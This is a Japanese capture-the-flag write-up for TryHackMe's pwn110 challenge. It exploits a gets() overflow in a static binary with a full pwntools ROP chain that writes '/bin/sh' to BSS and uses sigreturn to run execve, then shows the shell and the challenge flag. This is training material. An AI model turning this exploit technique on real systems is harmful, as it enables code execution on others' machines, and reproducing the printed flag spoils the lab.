---
title: TryHackMe PWN101 Writeup (10) PWN110
pubDatetime: 2026-04-26
description: TryHackMe PWN101 Challenge 10のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn110-1644300525386.pwn110
pwn110-1644300525386.pwn110: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=9765ee1bc5e845af55929a99730baf4dccbb1990, for GNU/Linux 3.2.0, not stripped
```

## checksec

```shellsession
$ .venv/bin/pwn checksec pwn110-1644300525386.pwn110
[*] '/home/hat0uma/work/pwn110-1644300525386.pwn110'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## 実行

libc使えないらしい

```shellsession
$ ./pwn110-1644300525386.pwn110
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
a
```

## Ghidra

実行ファイルなんかでかいからlddしたら`not a dynamic executable`って出てきた。
libcをstatic linkしてるっぽい。
getsの脆弱性はあるけど、109みたいにlibcのsystem関数に飛ぶみたいなのはできない。

```c
void main(void)

{
  char local_28 [32];

  setup();
  banner();
  puts(&DAT_00495120);
  puts(&DAT_00495150);
  gets(local_28);
  return;
}
```

## solver

ROP組んでみる。
`system`はないのでsyscallでexecveを呼ぶようにする。

### ガジェット探し

1. pop rdi ; ret

```shellsession
$ .venv/bin/ROPgadget --binary pwn110-1644300525386.pwn110|grep "pop rdi ; ret"
0x000000000040191a : pop rdi ; ret
```

1. pop rax ; ret

```shellsession
$ .venv/bin/ROPgadget --binary pwn110-1644300525386.pwn110|grep "pop rax ; ret"
0x00000000004497d7 : pop rax ; ret
0x0000000000471b77 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
```

1. syscall

```shellsession
$ .venv/bin/ROPgadget --binary pwn110-1644300525386.pwn110|grep "syscall"
(略)
0x00000000004012d3 : syscall
(略)
```

1. /bin/sh

なかった。

```
strings pwn110-1644300525386.pwn110| grep "/bin"
```

### 組み立て

/bin/shがないので、自分で作ることにする。
ただスタックアドレスをリークする方法がぱっと出てこなかったので、BSSに書き込む。
また、syscall 59を実行するにあたって、rdx, rsiを空にする必要があったが、pop rdi; ret, pop rdx; retが見当たらなかったので、
sigreturn(syscall 15)を使用するようにした。

```python
import pwn
from pwn import SigreturnFrame, log


bin = "./pwn110-1644300525386.pwn110"
elf = pwn.ELF(bin)
pwn.context.binary = elf
# p = pwn.process(bin)
p = pwn.remote("10.145.161.240", 9010)

ret = p.recvuntil("without libc 😏\n".encode())
print(ret.decode())

main_addr = 0x401E61.to_bytes(8, "little")
ret = 0x401EAC.to_bytes(8, "little")

# 0x00000000004497d7 : pop rax ; ret
# 0x000000000040191a : pop rdi ; ret
# 0x00000000004012d3 : syscall
bss = 0x004C2240.to_bytes(8, "little")
pop_rax_ret = 0x00000000004497D7.to_bytes(8, "little")
pop_rdi_ret = 0x000000000040191A.to_bytes(8, "little")
syscall = 0x00000000004012D3.to_bytes(8, "little")
gets_addr = 0x00411A10.to_bytes(8, "little")


# まず１回目で/bin/shをbssに書き込む。
payload = b""
payload += b"1" * 32  # バッファを埋める
payload += b"2" * 8  # saved_rbp
payload += pop_rdi_ret
payload += bss
payload += gets_addr
payload += main_addr
payload += b"\n"
log.info(payload)
p.send(payload)
p.send(b"/bin/sh\n")

# execve("/bin/sh", NULL, NULL)を実行するSigreturnFrameを作成
sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = int.from_bytes(bss, "little")
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = int.from_bytes(syscall, "little")

# sigreturnを実行するコード+作ったsigframeを書き込む
payload = b""
payload += b"1" * 32  # バッファを埋める
payload += b"2" * 8  # saved_rbp
payload += pop_rax_ret
payload += (15).to_bytes(8, "little")
payload += syscall
payload += bytes(sigframe)
log.info(payload)
p.send(payload)
# print(p.recvall().decode())
p.interactive()
```

### 実行結果

```shellsession
$ python3 solver-pwn110.py
[*] '/home/hat0uma/work/pwn110-1644300525386.pwn110'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 10.145.161.240 on port 9010: Done
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏

/home/hat0uma/work/.venv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ASCII, no gu
arantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 1111111111111111111111111111111122222222\x1a\x19@\x00\x00\x00\x00\x00@"L\x00\x00\x00\x00\x00\x10\x1aA\x00\x00\x00\x00\x00a
    @\x00\x00\x00\x00\x00
/home/hat0uma/work/.venv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1,
no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 1111111111111111111111111111111122222222× D\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00Ó\x12@\x00\x00\x00\x00\x0
0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00@"L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00\x00\x00\x00Ó\x12@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
flag.txt
pwn110
pwn110.c
$ cat flag.txt
THM{n1c3_us3_0f_g4dg37s}
$
[*] Interrupted
[*] Closed connection to 10.145.161.240 port 9010
```
